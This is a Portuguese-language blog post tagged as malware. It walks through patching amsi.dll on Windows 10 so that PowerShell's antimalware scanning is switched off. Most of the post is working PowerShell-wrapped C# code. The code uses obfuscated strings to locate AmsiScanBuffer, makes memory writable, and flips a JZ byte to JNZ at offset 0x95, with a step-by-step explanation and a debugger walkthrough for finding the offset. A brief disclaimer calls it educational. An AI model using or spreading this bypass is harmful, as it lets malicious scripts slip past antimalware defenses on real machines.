---
weight: 8
title: "Post VIII: Patch AMSI"
date: 2024-07-25T15:58:26+08:00
lastmod: 2024-07-25T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom, neste post estarei mostrando como realizar uma técnica para fazer um patch na `amsi.dll` do Windows10.

## O que é a AMSI.DLL

`Antimalware Scan Interface` é uma biblioteca do Windows que fornece uma interface padrão para permitir que aplicativos e serviços solicitem verificações antimalware em conteúdo carregado.
Um exemplo comum de uso da `amsi.dll` é na utilização do PowerShell para executar scripts. Quando um script é executado, a AMSI pode escanear o conteúdo do script para detectar e bloquear comandos potencialmente perigosos antes que eles sejam executados.
Abaixo, uma imagem para melhor entendimento:

![](https://telegra.ph/file/fd0546b0f37e24f04c80d.png)

> [!warning] warning 
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.

Para contornarmos isso, podemos fazer com que o `AMSI` execute muitas verificações de validação antes de atingir o código crítico de "verificação" do `AMSI`. Podemos debugar a `AMSI.dll` no `ida64.exe`. Temos apenas que encontrar o ponto crítico.
Abaixo, uma imagem para melhor entendimento:

![](https://telegra.ph/file/fc8340db699810552c51b.png)

![](https://telegra.ph/file/0366a7876f00425d4d148.png)

Para isso podemos simplesmente alternar um dos `JZ`/`JE` para `JNZ`/`JNE`, para entender melhor saiba que `0x74` = `JZ`/`JE` e `0x75` = `JNZ`/`JNE` o código para realizar o patch esta abaixo:

```csharp
$data = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class Program
{
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
	public static void Run()
	{
		IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
		IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
		IntPtr final = IntPtr.Add(amsi, ?);
		uint old = 0;
		VirtualProtect(final, (UInt32)0x1, 0x40, out old);

		Console.WriteLine(old);
		byte[] patch = new byte[] { 0x75 };

		Marshal.Copy(patch, 0, final, 1);

		VirtualProtect(final, (UInt32)0x1, old, out old);
	}
}
"@

Add-Type $data -Language CSharp 

[Program]::Run()

```

Abaixo está uma explicação mais detalhada para entender o código:

## Obter o Endereço da Função "AmsiScanBuffer"
Começamos pegando o endereço da função `AmsiScanBuffer` carregada na DLL `amsi.dll`:

```csharp
IntPtr lib = LoadLibrary("a" + "m" + "si." + "dll");
IntPtr amsi = GetProcAddress(lib, "Am" + "s" + "iScan" + "B" + "uffer");
```
### Calcular o Endereço Final

Somamos `?` ao endereço de `AmsiScanBuffer` para obter o endereço `final`, que contém a instrução `JZ/JE`:

```csharp
IntPtr final = IntPtr.Add(amsi, ?);
```
### Alterar a Permissão de Memória

Alteramos a permissão de memória do endereço final para permitir escrita, então saiba que `0x40` é `PAGE_EXECUTE_READWRITE`. e então exibimos a permissão de memória anterior:

```csharp
uint old = 0;
VirtualProtect(final, (UInt32)0x1, 0x40, out old);
Console.WriteLine(old);
```
### Aplicar o Patch

Mudamos os primeiros bytes do endereço final para `0x75`, que altera a instrução para `JNZ`/`JNE`:

```csharp
byte[] patch = new byte[] { 0x75 };
Marshal.Copy(patch, 0, final, patch.Length);
```
## Primeiro passo:

![](https://telegra.ph/file/91d6fdc54ae0031f315c1.png)
### Segundo passo:
Aqui apenas definimos um BreakPoint para acharmos o endereço do `AmsiScanBuffer`.<br> depois presionamos `ctrl + b` colamos o hex que copiamos para então encontrar o endereço do `JZ`/`JE` que precisamos copiar:

![|750x509](https://telegra.ph/file/d15b4032834ce00374c9b.png)
### Terçeiro passo:
Aqui fazemos um calculo simples `Endereço do "AmsiScanBuffer"` + `Endereço do "JZ/JE"` que queremos modificar para `JNZ`/`JNE`:

![](https://telegra.ph/file/536b460067ccd8f58d941.png)
### Quarto passo:
Agora que sabemos quanto temos que adicionar `0x95` ao endereço do `AmsiScanBuffer` para chegar no endereço final `JZ/JE`, apenas o adicionamos no código:

```csharp
IntPtr final = IntPtr.Add(amsi, 0x95);
```

### Entendendo o processo:
Agora que terminamos de achar tudo que precisávamos, vamos executar o código no próprio PowerShell. ao executar nosso código, ele fará o seguinte: obterá o endereço de `AmsiScanBuffer`, adicionará `0x95` ao endereço para chegar ao endereço final `JZ/JE`, alterará as permissões para `0x40`, que corresponde a `PAGE_EXECUTE_READWRITE`, mudará o byte de `0x74` para `0x75`, que altera o `JZ/JE` para `JNZ/JNE`, e restaurará as permissões de memória originais para garantir que nosso patch seja realizado com sucesso.
## Realizando o patch:

![|750x464](https://telegra.ph/file/5100d6f4aeafe8a89a9c6.png)
